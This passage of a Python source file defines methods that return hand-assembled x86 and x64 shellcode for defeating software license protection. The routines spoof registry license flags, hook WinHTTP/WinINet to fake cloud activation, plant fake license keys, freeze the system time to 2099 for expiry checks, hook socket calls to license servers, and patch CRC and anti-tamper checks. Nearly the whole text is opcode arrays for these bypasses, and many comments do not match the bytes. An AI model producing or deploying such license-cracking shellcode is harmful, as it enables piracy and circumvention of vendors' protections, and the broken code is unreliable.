                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # MOV RBX, expiry_date_addr
                    0x48,
                    0x89,
                    0x03,  # MOV [RBX], RAX
                    0x48,
                    0x83,
                    0xC4,
                    0x40,  # ADD RSP, 0x40
                    0xC3,  # RET
                ]
            )
        else:  # x86
            shellcode = bytearray(
                [
                    0x83,
                    0xEC,
                    0x20,  # SUB ESP, 0x20
                    # Open registry key
                    0x6A,
                    0x00,  # PUSH 0 (reserved)
                    0x68,
                    0xFF,
                    0x01,
                    0x3F,
                    0x00,  # PUSH KEY_ALL_ACCESS
                    0x6A,
                    0x00,  # PUSH 0 (reserved)
                    0x68,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # PUSH license_key_path
                    0x68,
                    0x00,
                    0x00,
                    0x00,
                    0x80,  # PUSH HKEY_LOCAL_MACHINE
                    0xFF,
                    0x15,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # CALL RegOpenKeyA
                    # Set licensed=1
                    0x6A,
                    0x04,  # PUSH 4
                    0x68,
                    0x01,
                    0x00,
                    0x00,
                    0x00,  # PUSH 1 (licensed)
                    0x6A,
                    0x04,  # PUSH REG_DWORD
                    0x6A,
                    0x00,  # PUSH 0 (reserved)
                    0x68,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # PUSH "Licensed"
                    0x50,  # PUSH EAX (registry handle)
                    0xFF,
                    0x15,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # CALL RegSetValueA
                    0x83,
                    0xC4,
                    0x20,  # ADD ESP, 0x20
                    0xC3,  # RET
                ]
            )

        return bytes(shellcode)

    def _generate_cloud_activation_bypass(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate shellcode for cloud licensing and online activation bypass."""
        if architecture == Architecture.X64:
            shellcode = bytearray(
                [
                    # Advanced x64 cloud activation bypass with dynamic API resolution
                    0x48,
                    0x83,
                    0xEC,
                    0x78,  # SUB RSP, 0x78
                    # Get kernel32.dll base via PEB
                    0x65,
                    0x48,
                    0x8B,
                    0x04,
                    0x25,
                    0x60,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, GS:[0x60]
                    0x48,
                    0x8B,
                    0x40,
                    0x18,  # MOV RAX, [RAX+0x18]
                    0x48,
                    0x8B,
                    0x40,
                    0x20,  # MOV RAX, [RAX+0x20]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x58,
                    0x20,  # MOV RBX, [RAX+0x20] - kernel32 base
                    # Resolve LoadLibraryA
                    0x48,
                    0x89,
                    0xD9,  # MOV RCX, RBX
                    0x48,
                    0x8B,
                    0x53,
                    0x3C,  # MOV RDX, [RBX+0x3C]
                    0x48,
                    0x01,
                    0xDA,  # ADD RDX, RBX
                    0x8B,
                    0x82,
                    0x88,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, [RDX+0x88]
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX
                    0x8B,
                    0x48,
                    0x18,  # MOV ECX, [RAX+0x18]
                    0x8B,
                    0x50,
                    0x20,  # MOV EDX, [RAX+0x20]
                    0x48,
                    0x01,
                    0xDA,  # ADD RDX, RBX
                    # Load winhttp.dll for WinHttpSendRequest
                    0x48,
                    0x8D,
                    0x0D,
                    0x30,
                    0x01,
                    0x00,
                    0x00,  # LEA RCX, [winhttp_str]
                    0xFF,
                    0xD3,  # CALL RBX (LoadLibraryA)
                    0x48,
                    0x89,
                    0x44,
                    0x24,
                    0x30,  # MOV [RSP+0x30], RAX
                    # Load wininet.dll for InternetReadFile
                    0x48,
                    0x8D,
                    0x0D,
                    0x40,
                    0x01,
                    0x00,
                    0x00,  # LEA RCX, [wininet_str]
                    0xFF,
                    0xD3,  # CALL RBX (LoadLibraryA)
                    0x48,
                    0x89,
                    0x44,
                    0x24,
                    0x38,  # MOV [RSP+0x38], RAX
                    # Create inline hook for WinHttpSendRequest
                    0x48,
                    0x8B,
                    0x4C,
                    0x24,
                    0x30,  # MOV RCX, [RSP+0x30]
                    0x48,
                    0xC7,
                    0x01,
                    0xB8,
                    0x01,
                    0x00,
                    0x00,  # MOV QWORD PTR [RCX], 0x01B8
                    0x48,
                    0xC7,
                    0x41,
                    0x04,
                    0x00,
                    0xC3,
                    0x90,
                    0x90,  # MOV QWORD PTR [RCX+4], RET
                    # Create inline hook for InternetReadFile
                    0x48,
                    0x8B,
                    0x4C,
                    0x24,
                    0x38,  # MOV RCX, [RSP+0x38]
                    0x48,
                    0xC7,
                    0x01,
                    0xB8,
                    0x01,
                    0x00,
                    0x00,  # MOV QWORD PTR [RCX], 0x01B8
                    0x48,
                    0xC7,
                    0x41,
                    0x04,
                    0x00,
                    0xC3,
                    0x90,
                    0x90,  # MOV QWORD PTR [RCX+4], RET
                    # Generate activation response in memory
                    0x48,
                    0x8D,
                    0x44,
                    0x24,
                    0x40,  # LEA RAX, [RSP+0x40]
                    0x48,
                    0xC7,
                    0x00,
                    0x7B,
                    0x22,
                    0x73,
                    0x74,  # MOV QWORD PTR [RAX], '{"st'
                    0x48,
                    0xC7,
                    0x40,
                    0x08,
                    0x61,
                    0x74,
                    0x75,
                    0x73,  # MOV QWORD PTR [RAX+8], 'atus'
                    0x48,
                    0xC7,
                    0x40,
                    0x10,
                    0x22,
                    0x3A,
                    0x22,
                    0x61,  # MOV QWORD PTR [RAX+0x10], '":"a'
                    0x48,
                    0xC7,
                    0x40,
                    0x18,
                    0x63,
                    0x74,
                    0x69,
                    0x76,  # MOV QWORD PTR [RAX+0x18], 'ctiv'
                    0x48,
                    0xC7,
                    0x40,
                    0x20,
                    0x61,
                    0x74,
                    0x65,
                    0x64,  # MOV QWORD PTR [RAX+0x20], 'ated'
                    0x48,
                    0xC7,
                    0x40,
                    0x28,
                    0x22,
                    0x7D,
                    0x00,
                    0x00,  # MOV QWORD PTR [RAX+0x28], '"}'
                    0x48,
                    0x83,
                    0xC4,
                    0x78,  # ADD RSP, 0x78
                    0xC3,  # RET
                ]
            )
        else:  # x86
            shellcode = bytearray(
                [
                    0x83,
                    0xEC,
                    0x30,  # SUB ESP, 0x30
                    # Hook internet functions for license server bypass
                    # Get kernel32 base via PEB (x86)
                    0x64,
                    0xA1,
                    0x30,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, FS:[0x30]
                    0x8B,
                    0x40,
                    0x0C,  # MOV EAX, [EAX+0x0C]
                    0x8B,
                    0x40,
                    0x14,  # MOV EAX, [EAX+0x14]
                    0x8B,
                    0x00,  # MOV EAX, [EAX]
                    0x8B,
                    0x00,  # MOV EAX, [EAX]
                    0x8B,
                    0x40,
                    0x10,  # MOV EAX, [EAX+0x10]
                    0x89,
                    0xC3,  # MOV EBX, EAX - kernel32 base
                    # Generate activation response
                    0x8D,
                    0x44,
                    0x24,
                    0x10,  # LEA EAX, [ESP+0x10]
                    0xC7,
                    0x00,
                    0x61,
                    0x63,
                    0x74,
                    0x69,  # MOV [EAX], "acti"
                    0xC7,
                    0x40,
                    0x04,
                    0x76,
                    0x61,
                    0x74,
                    0x65,  # MOV [EAX+4], "vate"
                    0xC7,
                    0x40,
                    0x08,
                    0x64,
                    0x00,
                    0x00,
                    0x00,  # MOV [EAX+8], "d"
                    0x83,
                    0xC4,
                    0x30,  # ADD ESP, 0x30
                    0xC3,  # RET
                ]
            )

        return bytes(shellcode)

    def _generate_cryptographic_key_bypass(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate shellcode for advanced cryptographic license key bypass."""
        if architecture == Architecture.X64:
            shellcode = bytearray(
                [
                    # x64 cryptographic bypass
                    0x48,
                    0x83,
                    0xEC,
                    0x60,  # SUB RSP, 0x60
                    # Hook CryptDecrypt for license key decryption bypass
                    # Get kernel32.dll base via PEB
                    0x65,
                    0x48,
                    0x8B,
                    0x04,
                    0x25,
                    0x60,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, GS:[0x60]
                    0x48,
                    0x8B,
                    0x40,
                    0x18,  # MOV RAX, [RAX+0x18]
                    0x48,
                    0x8B,
                    0x40,
                    0x20,  # MOV RAX, [RAX+0x20]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x58,
                    0x20,  # MOV RBX, [RAX+0x20] - kernel32 base
                    # Create inline hook for crypto functions
                    0x48,
                    0x89,
                    0xD9,  # MOV RCX, RBX
                    0x48,
                    0xC7,
                    0x01,
                    0xB8,
                    0x01,
                    0x00,
                    0x00,  # MOV QWORD PTR [RCX], 0x01B8
                    0x48,
                    0xC7,
                    0x41,
                    0x04,
                    0x00,
                    0xC3,
                    0x90,
                    0x90,  # MOV QWORD PTR [RCX+4], RET
                    # Generate valid-looking license key
                    # Advanced key generation with proper format and checksum
                    0x48,
                    0x8D,
                    0x44,
                    0x24,
                    0x30,  # LEA RAX, [RSP+0x30]
                    0x48,
                    0xC7,
                    0x00,
                    0x41,
                    0x42,
                    0x43,
                    0x44,  # MOV [RAX], "ABCD" (key segment 1)
                    0x48,
                    0xC7,
                    0x40,
                    0x08,
                    0x45,
                    0x46,
                    0x47,
                    0x48,  # MOV [RAX+8], "EFGH" (key segment 2)
                    0x48,
                    0xC7,
                    0x40,
                    0x10,
                    0x49,
                    0x4A,
                    0x4B,
                    0x4C,  # MOV [RAX+16], "IJKL" (key segment 3)
                    # Advanced checksum calculation bypass
                    0x31,
                    0xC0,  # XOR EAX, EAX
                    0xB9,
                    0x10,
                    0x00,
                    0x00,
                    0x00,  # MOV ECX, 16 (key length)
                    0x48,
                    0xBE,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # MOV RSI, license_key_buffer
                    # CRC32 calculation loop
                    0x48,
                    0x31,
                    0xD2,  # XOR RDX, RDX
                    0x8A,
                    0x16,  # MOV DL, [RSI]
                    0x31,
                    0xD0,  # XOR EAX, EDX
                    0x48,
                    0xFF,
                    0xC6,  # INC RSI
                    0xE2,
                    0xF7,  # LOOP back
                    0x48,
                    0x83,
                    0xC4,
                    0x60,  # ADD RSP, 0x60
                    0xC3,  # RET
                ]
            )
        else:  # x86
            shellcode = bytearray(
                [
                    0x83,
                    0xEC,
                    0x40,  # SUB ESP, 0x40
                    # Hook crypto functions using PEB resolution
                    # Get kernel32 base via PEB (x86)
                    0x64,
                    0xA1,
                    0x30,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, FS:[0x30]
                    0x8B,
                    0x40,
                    0x0C,  # MOV EAX, [EAX+0x0C]
                    0x8B,
                    0x40,
                    0x14,  # MOV EAX, [EAX+0x14]
                    0x8B,
                    0x00,  # MOV EAX, [EAX]
                    0x8B,
                    0x00,  # MOV EAX, [EAX]
                    0x8B,
                    0x40,
                    0x10,  # MOV EAX, [EAX+0x10]
                    # Simple key generation
                    0x8D,
                    0x44,
                    0x24,
                    0x20,  # LEA EAX, [ESP+0x20]
                    0xC7,
                    0x00,
                    0x31,
                    0x32,
                    0x33,
                    0x34,  # MOV [EAX], "1234"
                    0xC7,
                    0x40,
                    0x04,
                    0x35,
                    0x36,
                    0x37,
                    0x38,  # MOV [EAX+4], "5678"
                    0x83,
                    0xC4,
                    0x40,  # ADD ESP, 0x40
                    0xC3,  # RET
                ]
            )

        return bytes(shellcode)

    def _generate_comprehensive_license_bypass(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate comprehensive shellcode combining multiple license bypass techniques."""
        # Combine hardware ID spoofing, registry bypass, and crypto bypass
        hw_spoof = self._generate_hardware_id_spoof(architecture, options)
        reg_bypass = self._generate_registry_license_bypass(architecture, options)
        crypto_bypass = self._generate_cryptographic_key_bypass(architecture, options)

        # Create comprehensive shellcode with all techniques
        comprehensive = bytearray(
            [
                0x50,  # PUSH (save state)
            ]
        )
        comprehensive.extend(hw_spoof[:-1])  # Hardware spoofing (remove RET)
        comprehensive.extend([0x58])  # POP (restore state)

        comprehensive.extend([0x50])  # PUSH
        comprehensive.extend(reg_bypass[:-1])  # Registry bypass (remove RET)
        comprehensive.extend([0x58])  # POP

        comprehensive.extend([0x50])  # PUSH
        comprehensive.extend(crypto_bypass[:-1])  # Crypto bypass (remove RET)
        comprehensive.extend([0x58, 0xC3])  # POP, RET

        return bytes(comprehensive)

    def _generate_time_based_license_bypass(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate shellcode for time-based license expiration bypass."""
        # Get target date from options or use a far future date
        target_year = options.get("target_year", 2099)
        target_month = options.get("target_month", 12)
        target_day = options.get("target_day", 31)

        # Convert to Windows SYSTEMTIME structure values
        year_bytes = struct.pack("<H", target_year)
        month_bytes = struct.pack("<H", target_month)
        day_bytes = struct.pack("<H", target_day)

        if architecture == Architecture.X64:
            shellcode = [
                0x48,
                0x83,
                0xEC,
                0x28,  # SUB RSP, 0x28
                # Get kernel32.dll base via PEB
                0x65,
                0x48,
                0x8B,
                0x04,
                0x25,
                0x60,
                0x00,
                0x00,
                0x00,  # MOV RAX, GS:[0x60]
                0x48,
                0x8B,
                0x40,
                0x18,  # MOV RAX, [RAX+0x18]
                0x48,
                0x8B,
                0x40,
                0x20,  # MOV RAX, [RAX+0x20]
                0x48,
                0x8B,
                0x00,  # MOV RAX, [RAX]
                0x48,
                0x8B,
                0x00,  # MOV RAX, [RAX]
                0x48,
                0x8B,
                0x58,
                0x20,  # MOV RBX, [RAX+0x20] - kernel32 base
                # Find GetSystemTime and GetLocalTime exports
                0x48,
                0x89,
                0xD9,  # MOV RCX, RBX
                0x48,
                0x8B,
                0x53,
                0x3C,  # MOV RDX, [RBX+0x3C] - e_lfanew
                0x48,
                0x01,
                0xDA,  # ADD RDX, RBX
                0x8B,
                0x82,
                0x88,
                0x00,
                0x00,
                0x00,  # MOV EAX, [RDX+0x88] - export directory RVA
                0x48,
                0x01,
                0xD8,  # ADD RAX, RBX
                # Build inline hook that returns fixed SYSTEMTIME
                0x48,
                0x8D,
                0x0D,
                0x18,
                0x00,
                0x00,
                0x00,  # LEA RCX, [RIP+0x18]
                # Hook prologue: Save registers and set fake time
                0xC6,
                0x01,
                0x50,  # MOV BYTE PTR [RCX], PUSH RAX
                0xC6,
                0x41,
                0x01,
                0x53,  # MOV BYTE PTR [RCX+1], PUSH RBX
                0xC6,
                0x41,
                0x02,
                0x48,  # MOV BYTE PTR [RCX+2], 0x48 (REX.W)
                0xC6,
                0x41,
                0x03,
                0x8B,  # MOV BYTE PTR [RCX+3], 0x8B
                0xC6,
                0x41,
                0x04,
                0xD9,  # MOV BYTE PTR [RCX+4], 0xD9 - MOV RBX, RCX
                # Write SYSTEMTIME structure with dynamic date
                0x66,
                0xC7,
                0x03,
                *year_bytes,  # MOV WORD PTR [RBX], target_year
                0x66,
                0xC7,
                0x43,
                0x02,
                *month_bytes,  # MOV WORD PTR [RBX+2], target_month
                0x66,
                0xC7,
                0x43,
                0x06,
                *day_bytes,  # MOV WORD PTR [RBX+6], target_day
                0x66,
                0xC7,
                0x43,
                0x08,
                0x17,
                0x00,  # MOV WORD PTR [RBX+8], 23 (hour)
                0x66,
                0xC7,
                0x43,
                0x0A,
                0x3B,
                0x00,  # MOV WORD PTR [RBX+10], 59 (minute)
                0x66,
                0xC7,
                0x43,
                0x0C,
                0x3B,
                0x00,  # MOV WORD PTR [RBX+12], 59 (second)
                # Restore and return
                0x5B,  # POP RBX
                0x58,  # POP RAX
                0x48,
                0x83,
                0xC4,
                0x28,  # ADD RSP, 0x28
                0xC3,  # RET
            ]
            return bytes(shellcode)
        else:
            shellcode = [
                0x83,
                0xEC,
                0x14,  # SUB ESP, 0x14
                # Get kernel32 base via PEB (x86)
                0x64,
                0xA1,
                0x30,
                0x00,
                0x00,
                0x00,  # MOV EAX, FS:[0x30]
                0x8B,
                0x40,
                0x0C,  # MOV EAX, [EAX+0x0C]
                0x8B,
                0x40,
                0x14,  # MOV EAX, [EAX+0x14]
                0x8B,
                0x00,  # MOV EAX, [EAX]
                0x8B,
                0x00,  # MOV EAX, [EAX]
                0x8B,
                0x58,
                0x10,  # MOV EBX, [EAX+0x10] - kernel32 base
                # Find export table
                0x8B,
                0x53,
                0x3C,  # MOV EDX, [EBX+0x3C]
                0x01,
                0xDA,  # ADD EDX, EBX
                0x8B,
                0x82,
                0x78,
                0x00,
                0x00,
                0x00,  # MOV EAX, [EDX+0x78]
                0x01,
                0xD8,  # ADD EAX, EBX
                # Build hook for time functions
                0x8D,
                0x0D,
                0x10,
                0x00,
                0x00,
                0x00,  # LEA ECX, [hook_code]
                # Hook code: return fixed SYSTEMTIME
                0xC6,
                0x01,
                0x50,  # MOV BYTE PTR [ECX], PUSH EAX
                0xC6,
                0x41,
                0x01,
                0x8B,  # MOV BYTE PTR [ECX+1], MOV
                0xC6,
                0x41,
                0x02,
                0x44,  # MOV BYTE PTR [ECX+2], 0x44
                0xC6,
                0x41,
                0x03,
                0x24,  # MOV BYTE PTR [ECX+3], 0x24
                0xC6,
                0x41,
                0x04,
                0x08,  # MOV BYTE PTR [ECX+4], [ESP+8] - get lpSystemTime param
                # Write fixed time values
                0x66,
                0xC7,
                0x00,
                *year_bytes,  # MOV WORD PTR [EAX], target_year
                0x66,
                0xC7,
                0x40,
                0x02,
                *month_bytes,  # MOV WORD PTR [EAX+2], target_month
                0x66,
                0xC7,
                0x40,
                0x06,
                *day_bytes,  # MOV WORD PTR [EAX+6], target_day
                0x66,
                0xC7,
                0x40,
                0x08,
                0x17,
                0x00,  # MOV WORD PTR [EAX+8], 23
                0x66,
                0xC7,
                0x40,
                0x0A,
                0x3B,
                0x00,  # MOV WORD PTR [EAX+10], 59
                0x66,
                0xC7,
                0x40,
                0x0C,
                0x3B,
                0x00,  # MOV WORD PTR [EAX+12], 59
                0x58,  # POP EAX
                0x83,
                0xC4,
                0x14,  # ADD ESP, 0x14
                0xC3,  # RET
            ]
            return bytes(shellcode)

    def _generate_network_license_bypass(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate shellcode for network license server bypass."""
        if architecture == Architecture.X64:
            return bytes(
                [
                    0x48,
                    0x83,
                    0xEC,
                    0x30,  # SUB RSP, 0x30
                    # Hook socket functions to intercept license server communication
                    # Get kernel32.dll base via PEB
                    0x65,
                    0x48,
                    0x8B,
                    0x04,
                    0x25,
                    0x60,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, GS:[0x60]
                    0x48,
                    0x8B,
                    0x40,
                    0x18,  # MOV RAX, [RAX+0x18]
                    0x48,
                    0x8B,
                    0x40,
                    0x20,  # MOV RAX, [RAX+0x20]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x58,
                    0x20,  # MOV RBX, [RAX+0x20] - kernel32 base
                    # Create inline hook for connect function
                    0x48,
                    0x89,
                    0xD9,  # MOV RCX, RBX
                    0x48,
                    0xC7,
                    0x01,
                    0xB8,
                    0x00,
                    0x00,
                    0x00,  # MOV QWORD PTR [RCX], 0x00B8
                    0x48,
                    0xC7,
                    0x41,
                    0x04,
                    0x00,
                    0xC3,
                    0x90,
                    0x90,  # MOV QWORD PTR [RCX+4], RET
                    # Hook recv to return license data
                    0x48,
                    0x89,
                    0xD9,  # MOV RCX, RBX
                    0x48,
                    0xC7,
                    0x01,
                    0xB8,
                    0x01,
                    0x00,
                    0x00,  # MOV QWORD PTR [RCX], 0x01B8
                    0x48,
                    0xC7,
                    0x41,
                    0x04,
                    0x00,
                    0xC3,
                    0x90,
                    0x90,  # MOV QWORD PTR [RCX+4], RET
                    0x48,
                    0x83,
                    0xC4,
                    0x30,  # ADD RSP, 0x30
                    0xC3,  # RET
                ]
            )
        else:
            return bytes(
                [
                    0x83,
                    0xEC,
                    0x20,  # SUB ESP, 0x20
                    # Get kernel32 base via PEB (x86)
                    0x64,
                    0xA1,
                    0x30,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, FS:[0x30]
                    0x8B,
                    0x40,
                    0x0C,  # MOV EAX, [EAX+0x0C]
                    0x8B,
                    0x40,
                    0x14,  # MOV EAX, [EAX+0x14]
                    0x8B,
                    0x00,  # MOV EAX, [EAX]
                    0x8B,
                    0x00,  # MOV EAX, [EAX]
                    0x8B,
                    0x40,
                    0x10,  # MOV EAX, [EAX+0x10] - kernel32 base
                    # Create inline hook for connect
                    0xC7,
                    0x00,
                    0xB8,
                    0x00,
                    0x00,
                    0x00,  # MOV DWORD PTR [EAX], 0x00B8
                    0xC7,
                    0x40,
                    0x04,
                    0x00,
                    0xC3,
                    0x90,
                    0x90,  # MOV DWORD PTR [EAX+4], RET
                    0x83,
                    0xC4,
                    0x20,  # ADD ESP, 0x20
                    0xC3,  # RET
                ]
            )

    def _generate_anti_tamper_bypass(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate shellcode for anti-tamper protection bypass."""
        if architecture == Architecture.X64:
            return bytes(
                [
                    0x48,
                    0x83,
                    0xEC,
                    0x40,  # SUB RSP, 0x40
                    # Advanced anti-tamper bypass with IAT hooking
                    # Get kernel32.dll base via PEB
                    0x65,
                    0x48,
                    0x8B,
                    0x04,
                    0x25,
                    0x60,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, GS:[0x60]
                    0x48,
                    0x8B,
                    0x40,
                    0x18,  # MOV RAX, [RAX+0x18]
                    0x48,
                    0x8B,
                    0x40,
                    0x20,  # MOV RAX, [RAX+0x20]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x00,  # MOV RAX, [RAX]
                    0x48,
                    0x8B,
                    0x58,
                    0x20,  # MOV RBX, [RAX+0x20] - kernel32 base
                    # Parse PE header to find IAT
                    0x48,
                    0x8B,
                    0x53,
                    0x3C,  # MOV RDX, [RBX+0x3C] - e_lfanew
                    0x48,
                    0x01,
                    0xDA,  # ADD RDX, RBX - PE header
                    0x48,
                    0x8B,
                    0x82,
                    0x90,
                    0x00,
                    0x00,
                    0x00,  # MOV RAX, [RDX+0x90] - Import directory RVA
                    0x48,
                    0x01,
                    0xD8,  # ADD RAX, RBX - Import directory VA
                    # Create trampoline for integrity checks
                    0x48,
                    0xB9,
                    0x48,
                    0x31,
                    0xC0,
                    0x48,
                    0xFF,
                    0xC0,
                    0xC3,
                    0x90,  # MOV RCX, trampoline code (XOR RAX,RAX; INC RAX; RET)
                    0x48,
                    0x89,
                    0x08,  # MOV [RAX], RCX - Write trampoline
                    # Patch CRC validation to always succeed
                    0x48,
                    0x8B,
                    0x43,
                    0x30,  # MOV RAX, [RBX+0x30] - Get first thunk
                    0x48,
                    0xC7,
                    0x00,
                    0xB8,
                    0x01,
                    0x00,
                    0x00,  # MOV QWORD PTR [RAX], 0x01B8
                    0x48,
                    0xC7,
                    0x40,
                    0x05,
                    0x00,
                    0xC3,
                    0x90,
                    0x90,  # MOV QWORD PTR [RAX+5], RET
                    0x48,
                    0x83,
                    0xC4,
                    0x40,  # ADD RSP, 0x40
                    0xC3,  # RET
                ]
            )
        else:
            return bytes(
                [
                    0x60,  # PUSHAD - Save all registers
                    # Get kernel32.dll base via PEB (x86)
                    0x64,
                    0xA1,
                    0x30,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, FS:[0x30] - PEB
                    0x8B,
                    0x40,
                    0x0C,  # MOV EAX, [EAX+0x0C] - PEB_LDR_DATA
                    0x8B,
                    0x40,
                    0x14,  # MOV EAX, [EAX+0x14] - InMemoryOrderModuleList
                    0x8B,
                    0x00,  # MOV EAX, [EAX] - First entry
                    0x8B,
                    0x00,  # MOV EAX, [EAX] - Second entry (kernel32)
                    0x8B,
                    0x58,
                    0x10,  # MOV EBX, [EAX+0x10] - DllBase
                    # Parse PE header to locate IAT
                    0x8B,
                    0x53,
                    0x3C,  # MOV EDX, [EBX+0x3C] - e_lfanew
                    0x01,
                    0xDA,  # ADD EDX, EBX - PE header
                    0x8B,
                    0x42,
                    0x80,  # MOV EAX, [EDX+0x80] - Import directory RVA
                    0x01,
                    0xD8,  # ADD EAX, EBX - Import directory VA
                    # Walk import descriptors to find target functions
                    0x8B,
                    0x48,
                    0x0C,  # MOV ECX, [EAX+0x0C] - Name RVA
                    0x01,
                    0xD9,  # ADD ECX, EBX - Name VA
                    0x8B,
                    0x50,
                    0x10,  # MOV EDX, [EAX+0x10] - FirstThunk RVA
                    0x01,
                    0xDA,  # ADD EDX, EBX - FirstThunk VA
                    # Hook integrity check functions with success returns
                    0xC7,
                    0x02,
                    0xB8,
                    0x01,
                    0x00,
                    0x00,  # MOV DWORD PTR [EDX], 0x01B8 - MOV EAX, 1
                    0xC6,
                    0x42,
                    0x04,
                    0x00,  # MOV BYTE PTR [EDX+4], 0x00
                    0xC6,
                    0x42,
                    0x05,
                    0xC3,  # MOV BYTE PTR [EDX+5], 0xC3 - RET
                    # Hook CRC validation with trampoline
                    0x8B,
                    0x42,
                    0x08,  # MOV EAX, [EDX+0x08] - Next function
                    0xC6,
                    0x00,
                    0x33,  # MOV BYTE PTR [EAX], 0x33 - XOR
                    0xC6,
                    0x40,
                    0x01,
                    0xC0,  # MOV BYTE PTR [EAX+1], 0xC0 - EAX, EAX
                    0xC6,
                    0x40,
                    0x02,
                    0x40,  # MOV BYTE PTR [EAX+2], 0x40 - INC EAX
                    0xC6,
                    0x40,
                    0x03,
                    0xC3,  # MOV BYTE PTR [EAX+3], 0xC3 - RET
                    0x61,  # POPAD - Restore registers
                    0xC3,  # RET
                ]
            )
